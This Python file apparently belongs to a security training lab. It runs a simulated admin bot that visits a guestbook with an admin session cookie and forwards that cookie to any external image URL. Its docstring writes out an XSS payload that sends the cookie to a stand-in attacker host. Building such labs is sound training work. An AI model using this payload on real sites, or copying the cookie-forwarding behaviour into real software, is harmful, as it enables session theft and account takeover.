"""
Simulated victim bot for XSS cookie exfiltration.

Periodically visits the guestbook page with a valid admin session cookie.
If any <img> tags are found with external src URLs, the bot follows them —
sending its cookies along (simulating browser sub-resource requests).

This allows an attacker to steal the admin cookie by injecting:
  <img src="http://ATTACKER_IP:PORT/steal">

The bot's request to that URL will include the Cookie header with session_token.
"""
import os
import re
import time
import hashlib
import logging
import requests
from html.parser import HTMLParser

logging.basicConfig(level=logging.INFO, format="[bot] %(asctime)s %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("bot")

APP_URL = os.environ.get("APP_URL", "http://127.0.0.1:80")
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "admintok_" + hashlib.md5(b"redtrail-complex-lab").hexdigest())
INTERVAL = int(os.environ.get("BOT_INTERVAL", "15"))


class ImgSrcExtractor(HTMLParser):
    def __init__(self):
        super().__init__()
        self.srcs = []

    def handle_starttag(self, tag, attrs):
        if tag == "img":
            for attr, val in attrs:
                if attr == "src" and val:
                    self.srcs.append(val)


def visit_guestbook():
    cookies = {"session_token": ADMIN_TOKEN}
    try:
        resp = requests.get(f"{APP_URL}/guestbook", cookies=cookies, timeout=10)
        if resp.status_code != 200:
            log.warning("guestbook returned %d", resp.status_code)
            return

        parser = ImgSrcExtractor()
        parser.feed(resp.text)

        for src in parser.srcs:
            if src.startswith("http://") or src.startswith("https://"):
                log.info("following img src: %s", src)
                try:
                    requests.get(src, cookies=cookies, timeout=5)
                except Exception:
                    pass
    except Exception as e:
        log.warning("error visiting guestbook: %s", e)


def main():
    log.info("bot started — visiting %s/guestbook every %ds", APP_URL, INTERVAL)
    while True:
        visit_guestbook()
        time.sleep(INTERVAL)


if __name__ == "__main__":
    main()
